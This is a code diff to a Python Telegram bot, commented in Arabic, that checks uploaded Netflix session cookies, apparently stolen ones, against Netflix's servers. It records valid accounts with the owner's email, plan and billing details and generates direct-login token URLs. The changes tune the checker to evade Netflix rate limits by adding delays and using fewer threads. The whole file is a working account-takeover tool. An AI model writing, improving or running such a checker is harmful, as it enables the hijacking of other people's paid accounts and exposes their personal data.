@@ -169,7 +169,7 @@ def check_netflix_cookie(cookie_dict):
     }
     
     try:
-        resp = session.get(url, headers=headers, timeout=30)
+        resp = session.get(url, headers=headers, timeout=20)
         txt = resp.text
         
         if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
@@ -313,7 +313,7 @@ def generate_token(netflix_id):
     }
 
     try:
-        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
+        response = requests.get(url, params=params, headers=headers, timeout=20, verify=False)
         data = response.json()
         
         if "value" in data and data["value"] and "account" in data["value"]:
@@ -357,15 +357,22 @@ def extract_zip_and_get_files(zip_path, extract_dir):
         return []
 
 def process_single_line(line):
-    netflix_id = extract_netflix_id(line)
-    if not netflix_id:
-        return None
-    account_info = check_netflix_cookie({"NetflixId": netflix_id})
-    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
-        token_result = generate_token(netflix_id)
-        account_info['token_result'] = token_result
-        add_account_to_db(account_info)
-        return account_info
+    try:
+        netflix_id = extract_netflix_id(line)
+        if not netflix_id:
+            return None
+        
+        # تأخير بسيط لمنع حظر الطلبات السريعة (Rate Limit)
+        time.sleep(0.5)
+        
+        account_info = check_netflix_cookie({"NetflixId": netflix_id})
+        if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+            token_result = generate_token(netflix_id)
+            account_info['token_result'] = token_result
+            add_account_to_db(account_info)
+            return account_info
+    except Exception as e:
+        logger.error(f"Error in process_single_line: {e}")
     return None
 
 def send_sub_required_message(message):
@@ -388,7 +395,7 @@ def send_welcome(message):
 
     welcome_text = (
         "🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
-        "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بسرعة فائقة.\n"
+        "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بدقة واستقرار.\n"
         "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت.\n\n"
         "📋 **الأوامر المتاحة:**\n"
         "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال من الذاكرة.\n"
@@ -467,7 +474,7 @@ def handle_documents(message):
 
     temp_dirs = []
     try:
-        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص السريع متعدد الخيوط...")
+        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص المستقر...")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -504,30 +511,33 @@ def handle_documents(message):
         valid_count = 0
         valid_accounts_text = ""
 
-        with ThreadPoolExecutor(max_workers=10) as executor:
+        # استخدام عدد خيوط آمن (max_workers=3) لمنع حظر الطلبات من Netflix
+        with ThreadPoolExecutor(max_workers=3) as executor:
             futures = [executor.submit(process_single_line, line.strip()) for line in all_lines if line.strip()]
             for future in as_completed(futures):
-                acc = future.result()
-                if acc:
-                    valid_count += 1
-                    res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
-                    res_msg += f"🌍 البلد: `{acc['country']}`\n"
-                    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
-                    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
-                    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
-                    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
-                    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
-                    
-                    token_result = acc.get('token_result', {})
-                    if token_result.get('status') == 'Success':
-                        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-                        res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+                try:
+                    acc = future.result()
+                    if acc:
+                        valid_count += 1
+                        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+                        res_msg += f"🌍 البلد: `{acc['country']}`\n"
+                        res_msg += f"📦 الباقة: `{acc['plan']}`\n"
+                        res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+                        res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
+                        res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
+                        res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
                         
-                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
-                    
-                    valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"
+                        token_result = acc.get('token_result', {})
+                        if token_result.get('status') == 'Success':
+                            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+                            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+                            
+                        bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+                        valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"
+                except Exception as ex:
+                    logger.error(f"Error handling future result: {ex}")
 
-        bot.edit_message_text(f"✅ انتهى الفحص. تم العثور على وحفظ ({valid_count}) حساب شغال وفعال في الذاكرة.", message.chat.id, msg_wait.message_id)
+        bot.edit_message_text(f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة.", message.chat.id, msg_wait.message_id)
 
         if valid_count > 0 and valid_accounts_text:
             result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
@@ -537,7 +547,7 @@ def handle_documents(message):
                 bot.send_document(message.chat.id, rf, caption="📁 ملف يضم ملخص الحسابات الصالحة التي تم استخراجها.")
 
     except Exception as e:
-        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
+        bot.reply_to(message, f"❌ حدث خطأ عام: {str(e)}")
     finally:
         for temp_dir in temp_dirs:
             try:
